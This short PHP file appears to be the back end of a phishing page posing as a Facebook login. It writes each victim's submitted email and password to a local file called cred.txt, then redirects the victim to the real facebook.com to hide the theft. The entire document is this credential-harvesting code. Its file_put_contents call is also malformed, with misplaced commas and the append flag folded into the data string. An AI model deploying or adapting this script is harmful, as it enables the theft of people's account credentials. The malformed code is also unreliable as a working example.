<?php
file_put_contents("cred.txt", "Login ; ", $_POST['email'], " password : " . $_POST['pass']. "\n".
FILE_APPEND);
header('Location: https://facebook.com/');
exit();
?>